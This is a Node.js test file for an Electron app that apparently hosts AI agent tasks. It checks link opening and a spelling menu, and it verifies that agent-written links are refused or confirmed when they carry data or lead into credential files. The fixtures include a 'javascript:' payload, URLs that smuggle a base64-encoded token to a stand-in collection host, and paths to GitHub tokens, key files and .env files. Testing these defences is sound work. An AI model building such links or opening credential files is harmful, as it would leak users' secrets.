import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { resolveLink, openLink, LINK_DATA_LIMIT, LINK_PART_LIMIT, LINK_LENGTH_LIMIT, localLinkReview, readerScope, linkDataSignals } from '../electron/links.mjs';
import { editingMenu } from '../electron/context-menu.mjs';

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'haven-links-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const file = path.join(root, 'A preview #1.png'); fs.writeFileSync(file, 'test');
  return { root, file };
}
test('local links handle spaces, encoding, relative paths, file URLs and source line references', async t => {
  const { root, file } = fixture(t);
  for (const href of [file, encodeURI(file), pathToFileURL(file).href, './A preview #1.png']) {
    const result = await resolveLink(href, root);
    assert.equal(result.path, fs.realpathSync(file)); assert.equal(result.action, 'open');
  }
  for (const suffix of [':12', ':12:3', '#L12', '#L12-L20']) assert.equal((await resolveLink(file + suffix, root)).path, fs.realpathSync(file));
  const colonFile = file + ':12'; fs.writeFileSync(colonFile, 'literal colon filename');
  assert.equal((await resolveLink(colonFile, root)).path, fs.realpathSync(colonFile));
});
test('web links remain external; missing files and unsafe schemes fail clearly', async t => {
  const { root } = fixture(t);
  for (const href of ['https://example.com/a?q=1#part', 'mailto:test@example.com']) assert.equal((await resolveLink(href, root)).kind, 'external');
  for (const href of ['javascript:alert(1)', 'data:text/html,test', 'vscode://open', 'file://server/path', '//server/path', '', '\0bad']) await assert.rejects(resolveLink(href, root));
  await assert.rejects(resolveLink('./missing.png', root), /missing or cannot be accessed/);
  await assert.rejects(resolveLink('./preview.png'), /task folder/);
});
test('document links use the OS viewer; executable files, apps and symlinks to scripts are only revealed', async t => {
  const { root, file } = fixture(t), calls = [];
  const shell = { openPath: async file => { calls.push(['open', file]); return ''; }, openExternal: async url => calls.push(['external', url]), showItemInFolder: file => calls.push(['reveal', file]) };
  await openLink(file, root, shell); assert.equal(calls[0][0], 'open');
  const script = path.join(root, 'run.sh'); fs.writeFileSync(script, '#!/bin/sh\nexit 0'); fs.chmodSync(script, 0o755);
  const alias = path.join(root, 'looks-like-an-image.png'); fs.symlinkSync(script, alias);
  assert.equal((await resolveLink(alias, root)).action, 'reveal');
  await openLink(alias, root, shell); assert.equal(calls[1][0], 'reveal');
  const app = path.join(root, 'Test.app'); fs.mkdirSync(app); assert.equal((await resolveLink(app, root)).action, 'reveal');
  fs.chmodSync(file, 0o755); assert.equal((await resolveLink(file, root)).action, 'reveal');
  fs.chmodSync(file, 0o644);
  await assert.rejects(openLink(file, root, { ...shell, openPath: async () => 'No handler' }), /macOS could not open/);
});
const params = { isEditable: true, formControlType: 'text-area', selectionText: '', misspelledWord: 'mispeling', dictionarySuggestions: ['misspelling', 'misspelling', 'mispeeling'], editFlags: { canUndo: true, canRedo: false, canCut: true, canCopy: true, canPaste: true, canSelectAll: true } };
test('native spelling suggestions replace the clicked word and preserve standard edit roles', () => {
  const replaced = [], contents = { isDestroyed: () => false, replaceMisspelling: word => replaced.push(word) };
  const menu = editingMenu(params, contents);
  assert.deepEqual(menu.filter(item => item.label).map(item => item.label), ['misspelling', 'mispeeling']);
  menu[0].click(); assert.deepEqual(replaced, ['misspelling']);
  assert.equal(menu.find(item => item.role === 'redo').enabled, false);
  assert.ok(menu.some(item => item.role === 'paste'));
  contents.isDestroyed = () => true; menu[1].click(); assert.equal(replaced.length, 1);
});
test('editing menu handles words without suggestions, ordinary selections and password fields', () => {
  const contents = { isDestroyed: () => false, replaceMisspelling() {} };
  const noSuggestions = editingMenu({ ...params, dictionarySuggestions: [] }, contents);
  assert.equal(noSuggestions[0].label, 'No spelling suggestions'); assert.equal(noSuggestions[0].enabled, false);
  assert.equal(editingMenu({ ...params, formControlType: 'input-password' }, contents).some(item => item.label), false);
  const readonly = editingMenu({ ...params, isEditable: false, selectionText: 'some text' }, contents);
  assert.deepEqual(readonly.map(item => item.role), ['copy', 'selectAll']);
  assert.deepEqual(editingMenu({ ...params, isEditable: false }, contents), []);
});

test('web links carrying a long query string or fragment open only after confirmation', async () => {
  const opened = [], asked = [];
  const shell = { openExternal: async url => opened.push(url), openPath: async () => '', showItemInFolder() {} };
  await openLink('https://example.com/docs?page=2', undefined, shell);
  assert.equal(opened.length, 1, 'Short links open directly');
  const leak = `https://collect.example/?d=${'A'.repeat(LINK_DATA_LIMIT + 1)}`;
  await openLink(leak, undefined, shell);
  assert.equal(opened.length, 1, 'Without a confirmation, a data-carrying link is refused');
  await openLink(leak, undefined, shell, async request => { asked.push(request); return false; });
  assert.equal(opened.length, 1, 'Cancel keeps it closed');
  assert.equal(asked[0].kind, 'data'); assert.equal(asked[0].url, leak); assert.equal(asked[0].carried, LINK_DATA_LIMIT + 4);
  await openLink(`https://x.example/#${'B'.repeat(200)}`, undefined, shell, async () => true);
  assert.equal(opened.length, 2, 'Fragments count as carried data too');
});

test('web links carrying data in the path, a subdomain or sheer length also ask first', async () => {
  for (const plain of ['https://github.com/org/repo/blob/main/src/index.ts', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', 'https://en.wikipedia.org/wiki/Base64',
    'https://stackoverflow.com/questions/12345678/how-do-i-undo-the-most-recent-local-commits-in-git', 'https://www.npmjs.com/package/@anthropic-ai/claude-agent-sdk', 'https://docs.python.org/3/library/os.path.html'])
    assert.deepEqual(linkDataSignals(plain), [], `${plain} opens directly`);
  const secret = Buffer.from('gh token ghp_example_value').toString('base64url');
  assert.deepEqual(linkDataSignals(`https://x.example/${secret}`), ['path'], 'A base64 path segment is flagged');
  assert.deepEqual(linkDataSignals(`https://x.example/c/${'a'.repeat(LINK_PART_LIMIT + 1)}`), ['path'], 'A long path segment is flagged');
  assert.deepEqual(linkDataSignals('https://x.example/9f86d081884c7d659a2feaf0'), ['path'], 'A hex blob is flagged');
  assert.deepEqual(linkDataSignals('https://x.example/a1b2-c3d4-e5f6-a7b8-c9d0-e1f2-a3b4-c5d6-e7f8'), ['path'], 'Hyphenated chunks are not a word slug');
  assert.deepEqual(linkDataSignals('https://orsxg5djnztsa5dpnnsw4mjsgm.x.example/'), ['host'], 'A base32 subdomain is flagged');
  assert.deepEqual(linkDataSignals(`https://${'b'.repeat(LINK_PART_LIMIT + 1)}.x.example/`), ['host'], 'A long subdomain label is flagged');
  const long = `https://x.example/${Array.from({ length: 40 }, () => 'page').join('/')}`;
  assert.ok(long.length > LINK_LENGTH_LIMIT); assert.deepEqual(linkDataSignals(long), ['length'], 'Many short segments are caught by total length');
  const opened = [], asked = [];
  const shell = { openExternal: async url => opened.push(url), openPath: async () => '', showItemInFolder() {} };
  await openLink(`https://x.example/${secret}`, undefined, shell);
  assert.equal(opened.length, 0, 'Without a confirmation, a path-carrying link is refused');
  await openLink(`https://${secret.toLowerCase().replace(/[^a-z0-9]/g, '')}.x.example/`, undefined, shell, async request => { asked.push(request); return false; });
  assert.equal(opened.length, 0, 'Cancel keeps it closed');
  assert.equal(asked[0].kind, 'data'); assert.deepEqual(asked[0].signals, ['host']); assert.match(asked[0].url, /^https:\/\/[a-z0-9]+\.x\.example\/$/, 'The confirmation carries the full URL');
  await openLink(`https://x.example/${secret}`, undefined, shell, async () => true);
  assert.equal(opened.length, 1, 'Confirming opens it');
});

test('links inside a Reader document are judged against the task folder that holds the document', async () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'haven-home-'));
  try {
    const project = path.join(home, 'Projects/app'), docs = path.join(project, 'docs'), elsewhere = path.join(home, 'Documents');
    for (const dir of [docs, elsewhere, path.join(home, '.config/gh')]) fs.mkdirSync(dir, { recursive: true });
    for (const [file, text] of [[path.join(docs, 'notes.md'), '[config](../../../.config/gh/hosts.yml)'], [path.join(project, 'README.md'), 'x'], [path.join(home, '.config/gh/hosts.yml'), 'token'], [path.join(elsewhere, 'a.md'), 'x'], [path.join(elsewhere, 'b.md'), 'x'], [path.join(home, 'other.md'), 'x']]) fs.writeFileSync(file, text);
    const notes = path.join(docs, 'notes.md'), tasks = [project, home + '/Unrelated'];
    const scope = readerScope(notes, tasks);
    assert.equal(scope, fs.realpathSync(project), 'The task folder holding the document is the scope, not just its own folder');
    const review = async (href, document = notes) => localLinkReview((await resolveLink(href, path.dirname(document))).path, readerScope(document, tasks), home);
    const hosts = path.join(home, '.config/gh/hosts.yml');
    assert.equal((await review(hosts)).kind, 'sensitive', 'An agent-written document cannot open a credential file without a warning');
    assert.equal((await review(path.join(home, 'other.md'))).kind, 'outside', 'Leaving the task folder from a document asks first');
    assert.equal(await review('../README.md'), null, 'Links within the task folder open as before');
    assert.equal(readerScope(path.join(elsewhere, 'a.md'), tasks), fs.realpathSync(elsewhere), 'A document outside every task is scoped to its own folder');
    assert.equal(await review('b.md', path.join(elsewhere, 'a.md')), null);
    assert.equal(readerScope(notes, [home, project]), fs.realpathSync(project), 'The deepest task folder wins');
    assert.equal((await review('../../../.config/gh/hosts.yml', notes)).kind, 'sensitive', 'Relative links are resolved from the document');
    assert.equal(localLinkReview(fs.realpathSync(path.join(home, '.config/gh/hosts.yml')), home, home).kind, 'sensitive', 'A task working in the home folder still asks before credential folders');
  } finally { fs.rmSync(home, { recursive: true, force: true }); }
});

test('chat links outside the task folder, or into credential locations, are flagged for confirmation', async () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'haven-home-'));
  try {
    const project = path.join(home, 'Projects/app'); fs.mkdirSync(path.join(project, 'docs'), { recursive: true });
    fs.mkdirSync(path.join(home, '.config/gh'), { recursive: true }); fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
    for (const file of ['docs/plan.md', 'server.key', '.env.local']) fs.writeFileSync(path.join(project, file), 'x');
    fs.writeFileSync(path.join(home, '.config/gh/hosts.yml'), 'token'); fs.writeFileSync(path.join(home, '.claude/settings.json'), '{}'); fs.writeFileSync(path.join(home, 'notes.md'), 'x');
    fs.symlinkSync(path.join(home, '.config/gh/hosts.yml'), path.join(project, 'docs/hosts.yml'));
    const review = async (href, cwd = project) => localLinkReview((await resolveLink(href, cwd)).path, cwd, home);
    assert.equal(await review('docs/plan.md'), null, 'Links inside the task folder open as before');
    assert.equal((await review(path.join(home, 'notes.md'))).kind, 'outside');
    assert.equal((await review(path.join(home, '.config/gh/hosts.yml'))).kind, 'sensitive');
    assert.equal((await review(`file://${path.join(home, '.claude/settings.json')}`)).kind, 'sensitive');
    assert.equal((await review('docs/hosts.yml')).kind, 'sensitive', 'A symlink into ~/.config is judged by its real path');
    assert.equal((await review('server.key')).kind, 'sensitive', 'Key files ask even inside the folder');
    assert.equal((await review('.env.local')).kind, 'sensitive');
    assert.equal((await review(path.join(home, '.claude/settings.json'), path.join(home, '.claude'))), null, 'A task working in ~/.claude opens its own files');
  } finally { fs.rmSync(home, { recursive: true, force: true }); }
});
